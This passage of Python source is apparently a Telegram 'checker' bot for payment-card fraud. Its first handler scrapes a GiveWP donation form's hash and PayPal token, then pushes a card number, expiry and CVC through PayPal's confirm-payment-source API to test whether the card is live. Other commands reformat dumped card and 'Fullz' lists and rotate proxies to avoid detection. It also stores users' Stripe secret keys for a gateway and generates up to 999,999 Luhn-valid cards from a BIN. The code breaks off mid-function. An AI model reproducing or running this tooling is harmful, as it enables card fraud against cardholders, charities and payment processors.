            sess.verify = False
            resp = sess.get(full_donate, headers={'user-agent': ua}, timeout=20)
            out.append(f'GET: {resp.status_code} {len(resp.text)}ch')
            id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', resp.text)
            id_form2 = re.search(r'name="give-form-id" value="(.*?)"', resp.text)
            nonec_m  = re.search(r'name="give-form-hash" value="(.*?)"', resp.text)
            enc_m    = re.search(r'"data-client-token":"(.*?)"', resp.text)
            out.append(f'form1={bool(id_form1)} form2={bool(id_form2)} hash={bool(nonec_m)} token={bool(enc_m)}')
            if not all([id_form1, id_form2, nonec_m, enc_m]):
                bot.reply_to(message, '\n'.join(out) + '\nFORM DATA MISSING')
                return
            id_form1=id_form1.group(1); id_form2=id_form2.group(1)
            nonec=nonec_m.group(1)
            dec = base64.b64decode(enc_m.group(1)).decode('utf-8')
            au_m = re.search(r'"accessToken":"(.*?)"', dec)
            au = au_m.group(1) if au_m else 'NONE'
            out.append(f'au={au[:30]}...')
            base_hdrs = {'origin':site_url,'referer':full_donate,'sec-ch-ua':'"Chromium";v="137"',
                'sec-ch-ua-mobile':'?1','sec-ch-ua-platform':'"Android"','sec-fetch-dest':'empty',
                'sec-fetch-mode':'cors','sec-fetch-site':'same-origin','user-agent':ua,'x-requested-with':'XMLHttpRequest'}
            sess.post(ajax_url, headers=base_hdrs, data={
                'give-honeypot':'','give-form-id-prefix':id_form1,'give-form-id':id_form2,
                'give-form-title':'','give-current-url':full_donate,'give-form-url':full_donate,
                'give-form-minimum':amount,'give-form-maximum':'999999.99','give-form-hash':nonec,
                'give-price-id':'custom','give-amount':amount,'give_stripe_payment_method':'',
                'payment-mode':'paypal-commerce','give_first':fn,'give_last':ln,'give_email':email,
                'card_name':f'{fn} {ln}','card_exp_month':'','card_exp_year':'',
                'give_action':'purchase','give-gateway':'paypal-commerce',
                'action':'give_process_donation','give_ajax':'true'}, timeout=20)
            mp1 = MultipartEncoder({'give-honeypot':(None,''),'give-form-id-prefix':(None,id_form1),
                'give-form-id':(None,id_form2),'give-form-title':(None,''),
                'give-current-url':(None,full_donate),'give-form-url':(None,full_donate),
                'give-form-minimum':(None,amount),'give-form-maximum':(None,'999999.99'),
                'give-form-hash':(None,nonec),'give-price-id':(None,'custom'),
                'give-recurring-logged-in-only':(None,''),'give-logged-in-only':(None,'1'),
                '_give_is_donation_recurring':(None,'0'),
                'give_recurring_donation_details':(None,'{"give_recurring_option":"yes_donor"}'),
                'give-amount':(None,amount),'give_stripe_payment_method':(None,''),
                'payment-mode':(None,'paypal-commerce'),'give_first':(None,fn),'give_last':(None,ln),
                'give_email':(None,email),'card_name':(None,f'{fn} {ln}'),
                'card_exp_month':(None,''),'card_exp_year':(None,''),'give-gateway':(None,'paypal-commerce')})
            h1 = {**base_hdrs,'content-type':mp1.content_type}; del h1['x-requested-with']
            ro = sess.post(ajax_url, params={'action':'give_paypal_commerce_create_order'}, headers=h1, data=mp1, timeout=20)
            out.append(f'CreateOrder: {ro.text[:120]}')
            try:
                tok = ro.json()['data']['id']
                out.append(f'tok={tok}')
            except:
                bot.reply_to(message, '\n'.join(out) + '\nORDER CREATION FAILED')
                return
            r3 = sess.post(f'https://api-m.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
                headers={'Authorization':f'Bearer {au}','Content-Type':'application/json',
                    'Accept':'application/json','PayPal-Request-Id':f'pp-{tok}','user-agent':ua},
                json={'payment_source':{'card':{'number':n,'expiry':f'20{yy}-{mm2}','security_code':cvc,
                    'attributes':{'verification':{'method':'SCA_WHEN_REQUIRED'}}}}},
                verify=False, timeout=20)
            out.append(f'Confirm: {r3.status_code} {r3.text[:120]}')
            mp2 = MultipartEncoder({'give-honeypot':(None,''),'give-form-id-prefix':(None,id_form1),
                'give-form-id':(None,id_form2),'give-form-title':(None,''),
                'give-current-url':(None,full_donate),'give-form-url':(None,full_donate),
                'give-form-minimum':(None,amount),'give-form-maximum':(None,'999999.99'),
                'give-form-hash':(None,nonec),'give-price-id':(None,'custom'),
                'give-recurring-logged-in-only':(None,''),'give-logged-in-only':(None,'1'),
                '_give_is_donation_recurring':(None,'0'),
                'give_recurring_donation_details':(None,'{"give_recurring_option":"yes_donor"}'),
                'give-amount':(None,amount),'give_stripe_payment_method':(None,''),
                'payment-mode':(None,'paypal-commerce'),'give_first':(None,fn),'give_last':(None,ln),
                'give_email':(None,email),'card_name':(None,f'{fn} {ln}'),
                'card_exp_month':(None,''),'card_exp_year':(None,''),'give-gateway':(None,'paypal-commerce')})
            h2 = {**base_hdrs,'content-type':mp2.content_type}; del h2['x-requested-with']
            final = sess.post(ajax_url, params={'action':'give_paypal_commerce_approve_order','order':tok},
                headers=h2, data=mp2, timeout=20)
            out.append(f'FINAL: {final.text[:200]}')
        except Exception as e:
            out.append(f'EXCEPTION: {traceback.format_exc()[:200]}')
        bot.reply_to(message, '<pre>' + '\n'.join(out) + '</pre>', parse_mode='HTML')
    threading.Thread(target=run).start()

@bot.message_handler(commands=["amadmin"])
def am_i_admin(message):
    """التحقق مما إذا كنت مشرفاً"""
    if message.from_user.id == admin:
        bot.reply_to(message, "<b>✅ أنت المشرف! يمكنك استخدام أوامر الإدارة.</b>")
    else:
        bot.reply_to(message, f"<b>❌ لست المشرف. معرفك: {message.from_user.id}</b>")

@bot.message_handler(commands=["sq", "thik"])
def thik_command(message):
    """Extract & align CCs from raw/messy text → num|mm|yy|cvv format."""
    text_body = ""
    src_label = ""

    replied = message.reply_to_message

    # ── Source 1: replied .txt file ───────────────────────────────
    if replied and replied.document and replied.document.file_name:
        fname = replied.document.file_name.lower()
        if fname.endswith('.txt'):
            # S4 fix: reject files > 1MB to prevent memory exhaustion
            _MAX_FILE_BYTES = 1 * 1024 * 1024  # 1 MB
            if replied.document.file_size and replied.document.file_size > _MAX_FILE_BYTES:
                bot.reply_to(message,
                    f"<b>❌ File too large ({replied.document.file_size // 1024}KB). "
                    f"Max allowed: 1MB.</b>", parse_mode='HTML')
                return
            wait_msg = bot.reply_to(message, "<b>⏳ File download ho rahi hai...</b>",
                                    parse_mode='HTML')
            try:
                file_info  = bot.get_file(replied.document.file_id)
                downloaded = bot.download_file(file_info.file_path)
                text_body  = downloaded.decode('utf-8', errors='ignore')
                src_label  = f"📄 {replied.document.file_name}"
            except Exception as e:
                bot.edit_message_text(
                    f"<b>❌ File download failed: {str(e)[:80]}</b>",
                    chat_id=message.chat.id,
                    message_id=wait_msg.message_id,
                    parse_mode='HTML')
                return
            bot.delete_message(message.chat.id, wait_msg.message_id)

    # ── Source 2: replied text/caption message ────────────────────
    if not text_body and replied:
        text_body = replied.text or replied.caption or ""

    # ── Source 3: inline text after command ───────────────────────
    if not text_body:
        parts = message.text.split(None, 1)
        if len(parts) > 1:
            text_body = parts[1]

    if not text_body.strip():
        bot.reply_to(
            message,
            "<b>ℹ️ /sq — CC Aligner\n\n"
            "Usage:\n"
            "• <code>/sq</code> — reply to a <b>.txt file</b> (any size)\n"
            "• <code>/sq</code> — reply to a message with raw CCs\n"
            "• <code>/sq [paste raw CCs here]</code>\n\n"
            "Supported formats:\n"
            "<code>4111111111111111 12 2026 123</code>\n"
            "<code>4111111111111111/12/26/123</code>\n"
            "<code>4111111111111111:12:26:123</code>\n"
            "<code>Live | 4111...|12|26|123 | Charge OK.</code>\n"
            "<code>4111111111111111 1226 123 John Smith US...</code> (Fullz)\n\n"
            "Output: <code>num|mm|yy|cvv</code></b>",
            parse_mode='HTML'
        )
        return

    lines = text_body.splitlines()
    found   = []
    skipped = 0
    seen    = set()

    for line in lines:
        line = line.strip()
        if not line:
            continue
        cc = _extract_cc(line)
        if cc and cc not in seen:
            found.append(cc)
            seen.add(cc)
        elif not cc:
            skipped += 1

    if not found:
        bot.reply_to(message,
            "<b>❌ Koi valid CC nahi mili.\n\n"
            "Check karo format sahi hai:\n"
            "<code>num|mm|yy|cvv</code> ya space/slash separated.</b>",
            parse_mode='HTML')
        return

    total   = len(found)
    # Telegram 4096 char limit — send in chunks if needed
    chunk_size = 200
    chunks     = [found[i:i+chunk_size] for i in range(0, total, chunk_size)]

    for idx, chunk in enumerate(chunks):
        header = (
            f"<b>✅ Aligned — {total} CC{'s' if total > 1 else ''}"
            + (f"  •  {skipped} skipped" if skipped else "")
            + (f"  •  Part {idx+1}/{len(chunks)}" if len(chunks) > 1 else "")
            + "</b>"
            + (f"\n<i>{src_label}</i>" if src_label else "")
            + "\n\n"
        )
        body = "<code>" + "\n".join(chunk) + "</code>"
        msg_text = header + body
        # Guard 4096 limit
        if len(msg_text) > 4090:
            msg_text = header + "<code>" + "\n".join(chunk[:100]) + "\n...</code>"
        if idx == 0:
            bot.reply_to(message, msg_text, parse_mode='HTML')
        else:
            bot.send_message(message.chat.id, msg_text, parse_mode='HTML')

@bot.message_handler(commands=["setproxy"])
def set_proxy_command(message):
    def my_function():
        id = message.from_user.id

        try:
            proxy_input = message.text.split(' ', 1)[1].strip()
        except IndexError:
            plist = _get_user_proxy_list(id)
            if plist:
                lines = "\n".join(f"  {i+1}. <code>{p}</code>" for i, p in enumerate(plist))
                bot.reply_to(message, f"<b>🌐 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ({len(plist)}):\n{lines}\n\n🔄 Rotation: auto (random per request)\n\n𝗧𝗼 𝗿𝗲𝗽𝗹𝗮𝗰𝗲 𝗮𝗹𝗹:\n/setproxy http://ip:port\n\n𝗧𝗼 𝗰𝗹𝗲𝗮𝗿:\n/setproxy off</b>", parse_mode='HTML')
            else:
                bot.reply_to(message, "<b>🌐 𝗡𝗼 𝗽𝗿𝗼𝘅𝘆 𝘀𝗲𝘁.\n\n𝗧𝗼 𝘀𝗲𝘁:\n/setproxy http://ip:port\n/addproxy — add multiple\n\n𝗦𝘂𝗽𝗽𝗼𝗿𝘁𝗲𝗱: HTTP, HTTPS, SOCKS4, SOCKS5</b>", parse_mode='HTML')
            return

        if proxy_input.lower() in ['off', 'none', 'remove', 'clear']:
            remove_user_proxy(id)
            bot.reply_to(message, "<b>✅ 𝗔𝗹𝗹 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗿𝗲𝗺𝗼𝘃𝗲𝗱. 𝗨𝘀𝗶𝗻𝗴 𝗱𝗶𝗿𝗲𝗰𝘁 𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗼𝗻 𝗻𝗼𝘄.</b>", parse_mode='HTML')
            return

        proxy_input = parse_proxy(proxy_input)
        set_user_proxy(id, proxy_input)
        bot.reply_to(message, f"<b>✅ 𝗣𝗿𝗼𝘅𝘆 𝘀𝗲𝘁 (𝗿𝗲𝗽𝗹𝗮𝗰𝗲𝗱 𝗮𝗹𝗹):\n<code>{proxy_input}</code>\n\n𝗨𝘀𝗲 /addproxy 𝘁𝗼 𝗮𝗱𝗱 𝗺𝗼𝗿𝗲 𝗳𝗼𝗿 𝗿𝗼𝘁𝗮𝘁𝗶𝗼𝗻.\n/setproxy off 𝘁𝗼 𝗰𝗹𝗲𝗮𝗿.</b>", parse_mode='HTML')

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["addproxy"])
def add_proxy_command(message):
    def my_function():
        id = message.from_user.id

        try:
            raw_input = message.text.split(' ', 1)[1].strip()
        except IndexError:
            plist = _get_user_proxy_list(id)
            count_txt = f" ({len(plist)} active)" if plist else ""
            bot.reply_to(message,
                f"<b>🌐 𝗔𝗱𝗱 𝗣𝗿𝗼𝘅𝘆{count_txt}\n\n"
                "𝗦𝗶𝗻𝗴𝗹𝗲:\n"
                "<code>/addproxy ip:port</code>\n"
                "<code>/addproxy socks5://ip:port</code>\n\n"
                "𝗠𝘂𝗹𝘁𝗶𝗽𝗹𝗲 (𝗼𝗻𝗲 𝗽𝗲𝗿 𝗹𝗶𝗻𝗲):\n"
                "<code>/addproxy\n"
                "1.2.3.4:8080\n"
                "socks5://5.6.7.8:1080\n"
                "user:pass@9.10.11.12:3128</code>\n\n"
                "🔄 Proxies rotate randomly per request.\n"
                "𝗦𝘂𝗽𝗽𝗼𝗿𝘁𝗲𝗱: HTTP, HTTPS, SOCKS4, SOCKS5</b>",
                parse_mode='HTML')
            return

        raw_lines = [l.strip() for l in raw_input.replace(',', '\n').split('\n') if l.strip()]
        added = 0
        dupes = 0
        total_now = 0
        for raw in raw_lines:
            parsed = parse_proxy(raw)
            old_list = _get_user_proxy_list(id)
            if parsed in old_list:
                dupes += 1
                continue
            total_now = add_user_proxy(id, parsed)
            added += 1

        if not total_now:
            total_now = len(_get_user_proxy_list(id))

        plist = _get_user_proxy_list(id)
        lines = "\n".join(f"  {i+1}. <code>{p}</code>" for i, p in enumerate(plist[-10:]))
        extra = f"\n  ... +{len(plist)-10} more" if len(plist) > 10 else ""
        dupe_txt = f"\n⚠️ {dupes} duplicate(s) skipped" if dupes else ""

        bot.reply_to(message,
            f"<b>✅ {added} proxy(s) added!{dupe_txt}\n\n"
            f"🌐 𝗣𝗿𝗼𝘅𝘆 𝗣𝗼𝗼𝗹 ({len(plist)} total):\n{lines}{extra}\n\n"
            f"🔄 Rotation: random per request\n"
            f"/removeproxy — remove · /proxycheck — test</b>",
            parse_mode='HTML')

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["removeproxy"])
def remove_proxy_command(message):
    def my_function():
        id = message.from_user.id
        plist = _get_user_proxy_list(id)

        if not plist:
            bot.reply_to(message, "<b>❌ 𝗡𝗼 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝘁𝗼 𝗿𝗲𝗺𝗼𝘃𝗲.\n\n/addproxy 𝘁𝗼 𝗮𝗱𝗱 𝗽𝗿𝗼𝘅𝗶𝗲𝘀.</b>", parse_mode='HTML')
            return

        try:
            arg = message.text.split(' ', 1)[1].strip()
        except IndexError:
            arg = ''

        # ── No argument → show list + usage ──────────────────────────────
        if arg == '':
            numbered = "\n".join(
                f"  <code>{i+1}.</code> <code>{px[:55]}</code>"
                for i, px in enumerate(plist)
            )
            bot.reply_to(message,
                f"<b>🗂 Your Proxies ({len(plist)} total):</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"{numbered}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"<b>Usage:</b>\n"
                f"<code>.removeproxy socks5://1.2.3.4:1080</code> — remove specific\n"
                f"<code>.removeproxy all</code> — remove all",
                parse_mode='HTML')
            return

        # ── .removeproxy all ─────────────────────────────────────────────
        if arg.lower() in ('all', 'clear'):
            remove_user_proxy(id)
            bot.reply_to(message,
                f"<b>✅ All {len(plist)} proxies removed!\n\n"
                f"🔗 Using direct connection now.\n"
                f".addproxy to add new.</b>",
                parse_mode='HTML')

        # ── .removeproxy <proxy> — specific ──────────────────────────────
        else:
            # Support removal by number (.removeproxy 2)
            if arg.isdigit():
                idx = int(arg) - 1
                if 0 <= idx < len(plist):
                    target = plist[idx]
                else:
                    bot.reply_to(message,
                        f"<b>❌ Invalid number. You have {len(plist)} proxies (1–{len(plist)}).</b>",
                        parse_mode='HTML')
                    return
            else:
                target = parse_proxy(arg)

            remaining = remove_user_proxy(id, target)
            bot.reply_to(message,
                f"<b>✅ Proxy removed:</b>\n"
                f"<code>{target[:60]}</code>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"📊 <b>{remaining}</b> proxy(s) remaining.",
                parse_mode='HTML')

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["proxycheck"])
def proxy_check_command(message):
    def my_function():
        id = message.from_user.id
        plist = _get_user_proxy_list(id)

        if not plist:
            bot.reply_to(message, "<b>❌ 𝗡𝗼 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝘀𝗲𝘁.\n\n/addproxy 𝘁𝗼 𝗮𝗱𝗱 𝗽𝗿𝗼𝘅𝗶𝗲𝘀.</b>", parse_mode='HTML')
            return

        msg = bot.reply_to(message, f"<b>🔄 𝗧𝗲𝘀𝘁𝗶𝗻𝗴 {len(plist)} 𝗽𝗿𝗼𝘅𝘆(𝘀)... ⏳</b>", parse_mode='HTML')

        results = []
        alive = 0
        dead = 0
        for i, px in enumerate(plist):
            pd = {'http': px, 'https': px}
            try:
                start_time = time.time()
                r = requests.get('https://api.ipify.org?format=json', proxies=pd, timeout=12)
                elapsed = round(time.time() - start_time, 2)
                ip_data = r.json()
                proxy_ip = ip_data.get('ip', '?')
                results.append(f"  ✅ {i+1}. <code>{px[:40]}</code> → {proxy_ip} ({elapsed}s)")
                alive += 1
            except requests.exceptions.ProxyError:
                results.append(f"  ❌ {i+1}. <code>{px[:40]}</code> → Connection Failed")
                dead += 1
            except requests.exceptions.Timeout:
                results.append(f"  ⏰ {i+1}. <code>{px[:40]}</code> → Timeout")
                dead += 1
            except Exception as e:
                results.append(f"  ❌ {i+1}. <code>{px[:40]}</code> → {str(e)[:30]}")
                dead += 1

        result_text = "\n".join(results)
        summary = f"✅ {alive} alive · ❌ {dead} dead" if dead else f"✅ All {alive} alive"

        try:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg.message_id,
                text=f"<b>🌐 𝗣𝗿𝗼𝘅𝘆 𝗖𝗵𝗲𝗰𝗸 𝗥𝗲𝘀𝘂𝗹𝘁𝘀:\n\n{result_text}\n\n📊 {summary}\n🔄 Rotation: random per request</b>",
                parse_mode='HTML'
            )
        except:
            bot.send_message(message.chat.id,
                f"<b>🌐 𝗣𝗿𝗼𝘅𝘆 𝗖𝗵𝗲𝗰𝗸 𝗥𝗲𝘀𝘂𝗹𝘁𝘀:\n\n{result_text}\n\n📊 {summary}\n🔄 Rotation: random per request</b>",
                parse_mode='HTML'
            )

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["setamount"])
def set_amount_command(message):
    def my_function():
        id = message.from_user.id
        
        try:
            amount = message.text.split(' ', 1)[1].strip()
            amount_float = float(amount)
            
            if amount_float < 0.01 or amount_float > 5.00:
                bot.reply_to(message, "<b>❌ 𝗔𝗺𝗼𝘂𝗻𝘁 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗯𝗲𝘁𝘄𝗲𝗲𝗻 $0.01 𝗮𝗻𝗱 $5.00</b>")
                return
            
            set_user_amount(id, f"{amount_float:.2f}")
            bot.reply_to(message, f"<b>✅ 𝗔𝗺𝗼𝘂𝗻𝘁 𝘀𝗲𝘁 𝘁𝗼: ${amount_float:.2f}</b>")
            
        except (IndexError, ValueError):
            current = get_user_amount(id)
            bot.reply_to(message, f"<b>📊 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗮𝗺𝗼𝘂𝗻𝘁: ${current}\n\n𝗧𝗼 𝗰𝗵𝗮𝗻𝗴𝗲 𝘂𝘀𝗲:\n/setamount 0.50\n(𝗳𝗿𝗼𝗺 $0.01 𝘁𝗼 $5.00)</b>")
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["setsk"])
def setsk_command(message):
    def my_function():
        id = message.from_user.id
        plan, _ = get_user_plan(id)
        if plan == '𝗙𝗥𝗘𝗘':
            bot.reply_to(message, "<b>🔒 𝗩𝗜𝗣 𝗼𝗻𝗹𝘆 𝗳𝗲𝗮𝘁𝘂𝗿𝗲\n\n𝗨𝗽𝗴𝗿𝗮𝗱𝗲 𝘁𝗼 𝗩𝗜𝗣 𝘁𝗼 𝘂𝘀𝗲 𝘆𝗼𝘂𝗿 𝗼𝘄𝗻 𝗦𝗞 𝗸𝗲𝘆.</b>", parse_mode='HTML')
            return
        try:
            sk = message.text.split(' ', 1)[1].strip()
        except IndexError:
            current = get_user_sk(id)
            status = f"<code>{current[:12]}...{'*' * 10}</code>" if current else "𝗡𝗼𝘁 𝗦𝗲𝘁"
            bot.reply_to(message,
                f"<b>🔑 𝗦𝗞 𝗞𝗲𝘆 𝗠𝗮𝗻𝗮𝗴𝗲𝗿\n\n"
                f"𝗖𝘂𝗿𝗿𝗲𝗻𝘁: {status}\n\n"
                f"𝗧𝗼 𝘀𝗲𝘁 𝗸𝗲𝘆:\n<code>/setsk sk_live_xxxxxx</code>\n\n"
                f"𝗧𝗼 𝗿𝗲𝗺𝗼𝘃𝗲:\n<code>/delsk</code></b>",
                parse_mode='HTML'
            )
            return
        if not (sk.startswith('sk_live_') or sk.startswith('sk_test_')):
            bot.reply_to(message, "<b>❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗦𝗞 𝗸𝗲𝘆 𝗳𝗼𝗿𝗺𝗮𝘁.\n\n𝗠𝘂𝘀𝘁 𝘀𝘁𝗮𝗿𝘁 𝘄𝗶𝘁𝗵 <code>sk_live_</code> 𝗼𝗿 <code>sk_test_</code></b>", parse_mode='HTML')
            return
        set_user_sk(id, sk)
        masked = f"{sk[:12]}...{'*' * 10}"
        bot.reply_to(message,
            f"<b>✅ 𝗦𝗞 𝗸𝗲𝘆 𝘀𝗮𝘃𝗲𝗱!\n\n"
            f"🔑 𝗞𝗲𝘆: <code>{masked}</code>\n\n"
            f"ℹ️ 𝗬𝗼𝘂𝗿 /𝘀𝘁 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝘄𝗶𝗹𝗹 𝗻𝗼𝘄 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗦𝗞 𝗸𝗲𝘆 𝗶𝗻𝘀𝘁𝗲𝗮𝗱 𝗼𝗳 𝗱𝗲𝗳𝗮𝘂𝗹𝘁 𝗴𝗮𝘁𝗲𝘄𝗮𝘆.</b>",
            parse_mode='HTML'
        )
    threading.Thread(target=my_function).start()

@bot.message_handler(commands=["mysk"])
def mysk_command(message):
    def my_function():
        id = message.from_user.id
        sk = get_user_sk(id)
        if sk:
            masked = f"{sk[:12]}...{'*' * 10}"
            key_type = "🟢 𝗟𝗶𝘃𝗲" if sk.startswith('sk_live_') else "🟡 𝗧𝗲𝘀𝘁"
            bot.reply_to(message,
                f"<b>🔑 𝗬𝗼𝘂𝗿 𝗦𝗞 𝗞𝗲𝘆\n\n"
                f"𝗞𝗲𝘆: <code>{masked}</code>\n"
                f"𝗧𝘆𝗽𝗲: {key_type}\n\n"
                f"𝗨𝘀𝗲𝗱 𝗶𝗻: /𝘀𝘁 𝗴𝗮𝘁𝗲𝘄𝗮𝘆\n\n"
                f"𝗧𝗼 𝗿𝗲𝗺𝗼𝘃𝗲: /𝗱𝗲𝗹𝘀𝗸</b>",
                parse_mode='HTML'
            )
        else:
            bot.reply_to(message,
                "<b>🔑 𝗬𝗼𝘂𝗿 𝗦𝗞 𝗞𝗲𝘆\n\n❌ 𝗡𝗼 𝗦𝗞 𝗸𝗲𝘆 𝘀𝗲𝘁.\n\n𝗨𝘀𝗲 /𝘀𝗲𝘁𝘀𝗸 𝘁𝗼 𝗮𝗱𝗱 𝘆𝗼𝘂𝗿 𝗸𝗲𝘆.</b>",
                parse_mode='HTML'
            )
    threading.Thread(target=my_function).start()

@bot.message_handler(commands=["delsk"])
def delsk_command(message):
    def my_function():
        id = message.from_user.id
        sk = get_user_sk(id)
        if not sk:
            bot.reply_to(message, "<b>❌ 𝗡𝗼 𝗦𝗞 𝗸𝗲𝘆 𝘀𝗲𝘁.</b>", parse_mode='HTML')
            return
        delete_user_sk(id)
        bot.reply_to(message, "<b>✅ 𝗦𝗞 𝗸𝗲𝘆 𝗿𝗲𝗺𝗼𝘃𝗲𝗱. /𝘀𝘁 𝘄𝗶𝗹𝗹 𝗻𝗼𝘄 𝘂𝘀𝗲 𝗱𝗲𝗳𝗮𝘂𝗹𝘁 𝗴𝗮𝘁𝗲𝘄𝗮𝘆.</b>", parse_mode='HTML')
    threading.Thread(target=my_function).start()

@bot.message_handler(commands=["start"])
def start(message):
    def my_function():
        log_command(message, query_type='command')
        gate=''
        name = message.from_user.first_name
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        id=message.from_user.id
        
        try:BL=(json_data[str(id)]['plan'])
        except:
            BL='𝗙𝗥𝗘𝗘'
            with open("data.json", 'r', encoding='utf-8') as json_file:
                existing_data = json.load(json_file)
            new_data = {
                str(id) : {
      "plan": "𝗙𝗥𝗘𝗘",
      "timer": "none",
                }
            }
    
            existing_data.update(new_data)
            with _DATA_LOCK:
                with open("data.json", 'w', encoding='utf-8') as json_file:
                    json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:        
            keyboard = types.InlineKeyboardMarkup()
            contact_button = types.InlineKeyboardButton(text="YADISTAN ", url="https://t.me/yadistan")
            keyboard.add(contact_button)
            random_number = random.randint(33, 82)
            photo_url = f'https://t.me/bkddgfsa/{random_number}'
            bot.send_photo(
    chat_id=message.chat.id,
    photo=photo_url,
    caption=f'''<b>🌟 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 {name}! 🌟

𝗙𝗿𝗲𝗲 𝗯𝗼𝘁 𝗳𝗼𝗿 𝗮𝗹𝗹 𝗺𝘆 𝗳𝗿𝗶𝗲𝗻𝗱𝘀 𝗔𝗻𝗱 𝗮𝗻𝘆𝗼𝗻𝗲 𝗲𝗹𝘀𝗲 
━━━━━━━━━━━━━━━━━
🌟 𝗚𝗼𝗼𝗱 𝗹𝘂𝗰𝗸!  
『@yadistan』</b>
''', reply_markup=keyboard)
            return
        keyboard = types.InlineKeyboardMarkup()
        contact_button = types.InlineKeyboardButton(text="YADISTAN", url="https://t.me/yadistan")
        keyboard.add(contact_button)
        username = message.from_user.first_name
        random_number = random.randint(33, 82)
        photo_url = f'https://t.me/bkddgfsa/{random_number}'
        bot.send_photo(chat_id=message.chat.id, photo=photo_url, caption='''𝗖𝗹𝗶𝗰𝗸 /cmds 𝗧𝗼 𝗩𝗶𝗲𝘄 𝗧𝗵𝗲 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝗢𝗿 𝗦𝗲𝗻𝗱 𝗧𝗵𝗲 𝗙𝗶𝗹𝗲 𝗔𝗻𝗱 𝗜 𝗪𝗶𝗹𝗹 𝗖𝗵𝗲𝗰𝗸 𝗜𝘁''',reply_markup=keyboard)
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["gen"])
def gen_command(message):
    def my_function():
        id = message.from_user.id

        try:
            args = message.text.split(' ', 1)[1].strip()
        except IndexError:
            bot.reply_to(message,
                "<b>🃏 Card Generator\n\n"
                "Usage:\n"
                "  /gen BIN\n"
                "  /gen BIN amount\n\n"
                "Examples:\n"
                "  <code>/gen 411111</code> — 20 cards\n"
                "  <code>/gen 411111 100</code> — 100 cards (message)\n"
                "  <code>/gen 411111 1000</code> — 1000 cards (txt file)\n"
                "  <code>/gen 55442312xxxx|xx|xx|xxx 500</code>\n\n"
                "Default: 20 cards  •  No hard limit\n"
                "≤ 100 cards → message  •  > 100 → txt file</b>",
                parse_mode='HTML')
            return

        parts = args.split()
        bin_input = parts[0].strip()

        amount = 20
        if len(parts) > 1:
            try:
                amount = int(parts[1])
                if amount < 1:
                    amount = 1
                elif amount > 999999:
                    amount = 999999
            except ValueError:
                amount = 20

        bin_clean = bin_input.replace('x', '').replace('X', '')
        has_pipe = '|' in bin_input

        if has_pipe:
            card_parts = bin_input.split('|')
            bin_base = card_parts[0].strip()
            mm_template = card_parts[1].strip() if len(card_parts) > 1 else 'xx'
            yy_template = card_parts[2].strip() if len(card_parts) > 2 else 'xx'
            cvv_template = card_parts[3].strip() if len(card_parts) > 3 else 'xxx'
        else:
            bin_base = bin_clean
            mm_template = 'xx'
            yy_template = 'xx'
            cvv_template = 'xxx'

        if len(bin_base.replace('x','').replace('X','')) < 6:
            bot.reply_to(message, "<b>❌ 𝗕𝗜𝗡 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗮𝘁 𝗹𝗲𝗮𝘀𝘁 6 𝗱𝗶𝗴𝗶𝘁𝘀.</b>")
            return

        def luhn_check(card_number):
            digits = [int(d) for d in card_number]
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            total = sum(odd_digits)
            for d in even_digits:
                total += sum(divmod(d * 2, 10))
            return total % 10 == 0

        is_amex = bin_base[0] == '3'
        card_length = 15 if is_amex else 16
        cvv_length = 4 if is_amex else 3

        def generate_card():
            cc = ''
            for ch in bin_base:
                if ch.lower() == 'x':
                    cc += str(random.randint(0, 9))
                else:
                    cc += ch

            while len(cc) < card_length - 1:
                cc += str(random.randint(0, 9))

            for check_digit in range(10):
                test = cc + str(check_digit)
                if luhn_check(test):
                    cc = test
                    break

            if mm_template.lower() in ['xx', 'x', '']:
                mm = str(random.randint(1, 12)).zfill(2)
            else:
                mm = mm_template.zfill(2)

            current_year = datetime.now().year % 100
            if yy_template.lower() in ['xx', 'x', '']:
                yy = str(random.randint(current_year + 1, current_year + 5)).zfill(2)
            else:
                yy = yy_template.zfill(2)

            if cvv_template.lower() in ['xxx', 'xxxx', 'xx', 'x', '']:
                if is_amex:
                    cvv = str(random.randint(1000, 9999))
                else:
                    cvv = str(random.randint(100, 999)).zfill(3)
            else:
                cvv = cvv_template.zfill(cvv_length)

            return f"{cc}|{mm}|{yy}|{cvv}"

        cards = []
        seen = set()
        attempts = 0
        max_attempts = amount * 10
        while len(cards) < amount and attempts < max_attempts:
            card = generate_card()
            if card not in seen:
                seen.add(card)
                cards.append(card)
            attempts += 1

        bin_num = bin_base[:6]
        bin_info, bank, country, country_code = get_bin_info(bin_num)

        total_gen = len(cards)

        _cc  = country_code if country_code and country_code not in ('N/A','??','','Unknown') else ''
        _ct  = f"{country} ({_cc})" if _cc else (country or '—')
        _b   = bin_info if bin_info and bin_info not in ('Unknown','Unknown - ','') else '—'
        _bk  = bank if bank and bank not in ('Unknown','') else '—'
        _SEP = '─────────────────────────────'
